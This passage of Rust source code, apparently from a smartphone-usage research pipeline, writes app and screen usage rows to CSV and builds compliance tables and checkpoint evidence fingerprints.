                row.screen_interval_id.as_deref().unwrap_or(""),
                &mut first,
            );
            emit(
                &mut out,
                row.schoedel_completion
                    .map(b05::SchoedelCompletion::canonical_id)
                    .unwrap_or(""),
                &mut first,
            );
        }
        if opts.include_app_usage_end_reason {
            // Blank rather than a placeholder when a row is not an episode
            // (a placeholder day, a filtered row): "no episode ended here" and
            // "an episode ended for an unknown reason" are different claims,
            // and `Unobserved` is already the second one.
            emit(
                &mut out,
                row.app_usage_end_reason.as_deref().unwrap_or(""),
                &mut first,
            );
        }
        if opts.session_grouping_policy != SessionGroupingPolicy::None {
            emit_csv_optional_i64(&mut out, row.usage_session_id, &mut first);
        }
        emit_csv_optional_float(&mut out, row.duration_seconds, &mut first);
        emit_csv_optional_float(&mut out, row.duration_minutes, &mut first);
        if opts.micro_use_classification_policy != MicroUseClassificationPolicy::None {
            emit(
                &mut out,
                row.micro_use_classification
                    .map(MicroUseClassification::canonical_id)
                    .unwrap_or("not_applicable"),
                &mut first,
            );
        }
        if opts.minimum_duration_comparator != MinimumDurationComparator::StrictLt
            || opts.minimum_duration_disposition
                != MinimumDurationDisposition::ChronicleBlankKeepRow
        {
            emit_csv_optional_float(
                &mut out,
                row.raw_episode_duration_ns
                    .map(|duration| duration as f64 / 1_000_000_000.0),
                &mut first,
            );
            emit(
                &mut out,
                row.minimum_duration_qualified
                    .map(|qualified| if qualified { "true" } else { "false" })
                    .unwrap_or(""),
                &mut first,
            );
            emit(
                &mut out,
                if row.raw_episode_start_timestamp_ns.is_some() {
                    if row.minimum_duration_aggregate_eligible {
                        "true"
                    } else {
                        "false"
                    }
                } else {
                    ""
                },
                &mut first,
            );
        }
        if maximum_duration_columns {
            if !b04_columns {
                emit_csv_optional_float(
                    &mut out,
                    row.raw_episode_duration_ns
                        .map(|duration| duration as f64 / 1_000_000_000.0),
                    &mut first,
                );
            }
            emit(
                &mut out,
                row.maximum_duration_qualified
                    .map(|qualified| if qualified { "true" } else { "false" })
                    .unwrap_or(""),
                &mut first,
            );
            emit(
                &mut out,
                if row.maximum_duration_qualified.is_some() {
                    if row.maximum_duration_aggregate_eligible {
                        "true"
                    } else {
                        "false"
                    }
                } else {
                    ""
                },
                &mut first,
            );
            emit_csv_optional_float(
                &mut out,
                row.maximum_duration_trimmed_ns
                    .map(|trimmed| trimmed as f64 / 1_000_000_000.0),
                &mut first,
            );
            emit(
                &mut out,
                row.effective_endpoint_reason
                    .map(b06::MaximumDurationEffectiveEndpointReason::canonical_id)
                    .unwrap_or(""),
                &mut first,
            );
        }
        emit(&mut out, &row.any_app_usage_flags, &mut first);
        emit_csv_float(&mut out, row.data_time_gap_hours, &mut first);
        emit_csv_u8(&mut out, row.day, &mut first);
        emit_csv_u8(&mut out, row.weekday_mf, &mut first);
        emit_csv_u8(&mut out, row.weekday_mth, &mut first);
        emit_csv_u8(&mut out, row.weekday_su_th, &mut first);
        emit_csv_u8(&mut out, row.hour, &mut first);
        emit_csv_u8(&mut out, row.quarter, &mut first);
        emit_csv_i32(&mut out, row.valid_app_new_engage_30s, &mut first);
        emit_csv_i32(&mut out, row.valid_app_new_engage_custom, &mut first);
        emit_csv_i32(&mut out, row.valid_app_switched_app, &mut first);
        emit_csv_float(&mut out, row.valid_app_usage_time_gap_hours, &mut first);
        emit_csv_i32(&mut out, row.any_app_new_engage_30s, &mut first);
        emit_csv_i32(&mut out, row.any_app_new_engage_custom, &mut first);
        emit_csv_i32(&mut out, row.any_app_switched_app, &mut first);
        emit_csv_float(&mut out, row.any_app_usage_time_gap_hours, &mut first);
        emit(&mut out, pp_version, &mut first);
        emit(&mut out, dop, &mut first);
        if opts.model_concurrent_usage || opts.use_background_apps_file {
            emit(
                &mut out,
                row.usage_layer.as_deref().unwrap_or(""),
                &mut first,
            );
        }
        out.push(b'\n');
        sink.write_all(&out).map_err(|error| error.to_string())?;
        out.clear();
    }
    Ok(())
}

pub(super) fn write_screen_csv(rows: &[Row], opts: &PipelineV2Options) -> Vec<u8> {
    write_screen_csv_with_b05(rows, opts, None)
}

pub(super) fn write_selected_screen_csv(
    rows: &[Row],
    opts: &PipelineV2Options,
    preflight: &B05SchoedelPreflightResult,
) -> Result<Vec<u8>, String> {
    if opts.screen_session_construction_strategy
        == ScreenSessionConstructionStrategyId::ChronicleScreenInteractiveV1
    {
        return Ok(write_screen_csv(rows, opts));
    }
    let intervals = &preflight
        .screen_construction
        .as_ref()
        .ok_or_else(|| "b05_output_error:screen_construction_absent".to_string())?
        .intervals;
    let mut bytes = Vec::with_capacity(rows.len().saturating_mul(384));
    write_screen_csv_with_b05_to(rows, opts, Some(intervals), &mut bytes)?;
    Ok(bytes)
}

pub(super) fn source_row_vector_wire(rows: &[u32]) -> String {
    rows.iter()
        .map(u32::to_string)
        .collect::<Vec<_>>()
        .join("|")
}

pub(super) fn write_screen_csv_with_b05(
    rows: &[Row],
    opts: &PipelineV2Options,
    intervals: Option<&[b05::ScreenIntervalEvidence]>,
) -> Vec<u8> {
    let mut bytes = Vec::with_capacity(rows.len().saturating_mul(384));
    write_screen_csv_with_b05_to(rows, opts, intervals, &mut bytes).expect("Vec writer");
    bytes
}

pub(super) fn write_screen_csv_with_b05_to(
    rows: &[Row],
    opts: &PipelineV2Options,
    intervals: Option<&[b05::ScreenIntervalEvidence]>,
    sink: &mut impl std::io::Write,
) -> Result<(), String> {
    let mut cols = intervals.map_or_else(build_screen_columns, |_| {
        declared_screen_output_columns_for_strategy(opts.screen_session_construction_strategy)
    });
    let include_classification = opts.screen_session_classification_policy != ScreenSessionClassificationPolicy::None;
    if include_classification {
        let index = cols.iter().position(|column| column == "screen_usage_foreground_app_package").expect("screen foreground column is declared");
        cols.insert(index + 1, "screen_usage_session_classification".into());
    }
    let intervals_by_id = intervals.map(|intervals| intervals.iter().map(|interval| (interval.screen_interval_id.as_str(), interval)).collect::<BTreeMap<_, _>>());
    if intervals.is_some_and(|intervals| intervals_by_id.as_ref().expect("present intervals").len() != intervals.len()) {
        return Err("b05_output_error:duplicate_screen_interval_id".into());
    }
    let selected_intervals = intervals_by_id.as_ref().map(|by_id| {
        rows.iter().map(|row| {
            let id = row.screen_interval_id.as_deref().ok_or_else(|| "b05_output_error:screen_row_interval_id_missing".to_string())?;
            by_id.get(id).copied().ok_or_else(|| "b05_output_error:screen_row_interval_identity_mismatch".to_string())
        }).collect::<Result<Vec<_>, String>>()
    }).transpose()?;
    let mut out = Vec::with_capacity(1024);
    for (i, c) in cols.iter().enumerate() {
        if i > 0 {
            out.push(b',');
        }
        append_csv_field(&mut out, c);
    }
    out.push(b'\n');
    sink.write_all(&out).map_err(|error| error.to_string())?;
    out.clear();
    let tz: Tz = opts.timezone.parse().unwrap_or(Tz::UTC);
    let pp_version = PREPROCESSOR_VERSION;
    let dop = &opts.datetime_of_preprocessing;
    for (row_index, row) in rows.iter().enumerate() {
        let row_tz = if row.timezone.as_str() == opts.timezone {
            tz
        } else {
            row.timezone.parse().unwrap_or(tz)
        };
        let mut first = true;
        let emit = |out: &mut Vec<u8>, s: &str, first: &mut bool| {
            if !*first {
                out.push(b',');
            }
            *first = false;
            append_csv_field(out, s);
        };
        emit(&mut out, &row.study_id, &mut first);
        emit(&mut out, &opts.study_name, &mut first);
        emit(&mut out, &row.participant_id, &mut first);
        emit(&mut out, &row.possible_device_model, &mut first);
        emit(&mut out, &row.username, &mut first);
        emit_event_timestamp(&mut out, row.event_timestamp_ns, row_tz, &mut first);
        emit(&mut out, &row.date, &mut first);
        emit(&mut out, &row.timezone, &mut first);
        emit(&mut out, &row.app_package_name, &mut first);
        emit(&mut out, "", &mut first); // application_label always empty
        emit(&mut out, &row.interaction_type, &mut first);
        emit_screen_timestamp(&mut out, row.start_timestamp_ns, row_tz, &mut first);
        emit_screen_timestamp(&mut out, row.stop_timestamp_ns, row_tz, &mut first);
        emit_csv_optional_float(&mut out, row.duration_seconds, &mut first);
        emit_csv_optional_float(&mut out, row.duration_minutes, &mut first);
        emit(
            &mut out,
            row.screen_usage_end_reason.as_deref().unwrap_or(""),
            &mut first,
        );
        emit_csv_optional_float(&mut out, row.screen_usage_end_reason_confidence, &mut first);
        emit(
            &mut out,
            row.screen_usage_stop_event_type.as_deref().unwrap_or(""),
            &mut first,
        );
        emit_screen_last_activity(
            &mut out,
            row.screen_usage_last_activity_timestamp_ns,
            row_tz,
            &mut first,
        );
        emit_csv_optional_float(&mut out, row.screen_usage_tail_gap_seconds, &mut first);
        emit(
            &mut out,
            row.screen_usage_foreground_app_package
                .as_deref()
                .unwrap_or(""),
            &mut first,
        );
        if include_classification {
            emit(&mut out, row.screen_usage_session_classification.as_deref().unwrap_or(""), &mut first);
        }
        emit(
            &mut out,
            row.screen_usage_apps_forcing_screen_open_label
                .as_deref()
                .unwrap_or(""),
            &mut first,
        );
        let lso = match row.screen_usage_lock_screen_only {
            None => "",
            Some(0) => "false",
            Some(_) => "true",
        };
        emit(&mut out, lso, &mut first);
        emit(&mut out, "", &mut first); // data_time_gap_hours always blank in screen
        emit_csv_u8(&mut out, row.day, &mut first);
        emit_csv_u8(&mut out, row.weekday_mf, &mut first);
        emit_csv_u8(&mut out, row.weekday_mth, &mut first);
        emit_csv_u8(&mut out, row.weekday_su_th, &mut first);
        emit_csv_u8(&mut out, row.hour, &mut first);
        emit_csv_u8(&mut out, row.quarter, &mut first);
        emit(&mut out, pp_version, &mut first);
        emit(&mut out, dop, &mut first);
        if let Some(selected_intervals) = &selected_intervals {
            let interval = selected_intervals[row_index];
            emit(&mut out, &interval.screen_interval_id, &mut first);
            emit(&mut out, interval.strategy_id.canonical_id(), &mut first);
            emit(&mut out, interval.kind.canonical_id(), &mut first);
            emit(
                &mut out,
                &interval.start_boundary_source_row.to_string(),
                &mut first,
            );
            emit(
                &mut out,
                &interval
                    .stop_boundary_source_row
                    .map(|value| value.to_string())
                    .unwrap_or_default(),
                &mut first,
            );
            emit(
                &mut out,
                &source_row_vector_wire(&interval.start_source_rows),
                &mut first,
            );
            emit(
                &mut out,
                &source_row_vector_wire(&interval.stop_source_rows),
                &mut first,
            );
            emit(&mut out, interval.close_reason.canonical_id(), &mut first);
            emit(
                &mut out,
                if interval.left_censored {
                    "true"
                } else {
                    "false"
                },
                &mut first,
            );
            emit(
                &mut out,
                if interval.right_censored {
                    "true"
                } else {
                    "false"
                },
                &mut first,
            );
        }
        out.push(b'\n');
        sink.write_all(&out).map_err(|error| error.to_string())?;
        out.clear();
    }
    Ok(())
}

/// Render a cadence for the provenance flag. Integer division would print a
/// 7.5 s cadence as `@7s`, and this flag is the row's only statement of the
/// instrument that produced it, so a whole cadence prints whole and a
/// fractional one prints its fraction rather than being silently truncated.
pub(super) fn format_cadence_seconds(interval_ns: i64) -> String {
    if interval_ns % 1_000_000_000 == 0 {
        return (interval_ns / 1_000_000_000).to_string();
    }
    format!("{}", interval_ns as f64 / 1_000_000_000.0)
}

pub(super) fn compliance_csv(
    result: &ComplianceResultCheckpoint,
    enrolled_devices: &BTreeMap<String, u32>,
) -> Vec<u8> {
    let mut lines = vec![
        "participant_id,date,sharing_status,known_minutes,unknown_minutes,compliance_percent,zero_real_usage,is_valid,expected_device_count".to_string(),
    ];
    for day in &result.days {
        let expected = enrolled_devices
            .get(&day.participant_id)
            .map(u32::to_string)
            .unwrap_or_default();
        lines.push(format!(
            "{},{date},{},{},{},{},{},{},{}",
            csv_escape_value(&day.participant_id),
            day.sharing_status,
            js_rounded_number(day.known_minutes),
            js_rounded_number(day.unknown_minutes),
            js_rounded_number(day.compliance_percent),
            u8::from(day.zero_real_usage),
            u8::from(day.is_valid),
            expected,
            date = day.date,
        ));
    }
    lines.join("\n").into_bytes()
}

#[allow(clippy::too_many_arguments)]
pub(crate) fn manifest_evidence_payloads<'a>(
    assembled_terminal_digest: &'a [u8],
    opener_set_evidence_fingerprint: &'a [u8],
    foundational_semantics_fingerprint: &'a [u8],
    eyes_tagged_fau_fingerprint: &'a [u8],
    b05_schoedel_fingerprint: &'a [u8],
    scientific_validation_fingerprint: &'a [u8],
    maximum_duration_fingerprint: Option<&'a [u8; 16]>,
    eyes_input_partition_fingerprint: Option<&'a [u8; 16]>,
    eyes_validation_fingerprint: Option<&'a [u8; 16]>,
) -> Vec<(&'static str, &'a [u8])> {
    let mut evidence: Vec<(&str, &[u8])> = vec![
        (
            "assembledOutputsCheckpoint",
            assembled_terminal_digest,
        ),
        ("openerSetEvidence", opener_set_evidence_fingerprint),
        (
            "foundationalSemanticsEvidence",
            foundational_semantics_fingerprint,
        ),
        ("eyesTaggedFauEvidence", eyes_tagged_fau_fingerprint),
        ("b05SchoedelEvidence", b05_schoedel_fingerprint),
        (
            "scientificEvidenceValidationReceipt",
            scientific_validation_fingerprint,
        ),
    ];
    if let Some(fingerprint) = maximum_duration_fingerprint {
        evidence.push(("maximumDurationEvidence", fingerprint));
    }
    if let Some(fingerprint) = eyes_input_partition_fingerprint {
        evidence.push(("eyesInputPartitionPreflight", fingerprint));
    }
    if let Some(fingerprint) = eyes_validation_fingerprint {
        evidence.push(("eyesTaggedFauValidationReceipt", fingerprint));
    }
    evidence
}

pub(crate) fn row_lineage_checkpoint_fingerprint(
    row_lineage: &[PipelineRowLineage],
) -> Result<[u8; 16], String> {
    super::value_fingerprint(row_lineage)
        .map_err(|error| format!("serialize row lineage checkpoint: {error}"))
}

pub(crate) fn aggregate_checkpoint_bytes<'a>(
    aggregates: impl Iterator<Item = Result<(&'a str, u32, String), String>>,
) -> Result<Vec<u8>, String> {
    serde_json::to_vec(
        &aggregates.map(|aggregate| {
            let (kind, row_count, digest) = aggregate?;
            Ok(serde_json::json!({
                "kind": kind,
                "rowCount": row_count,
                "digest": digest,
            }))
        }).collect::<Result<Vec<_>, String>>()?,
    )
    .map_err(|error| format!("serialize aggregate checkpoint: {error}"))
}
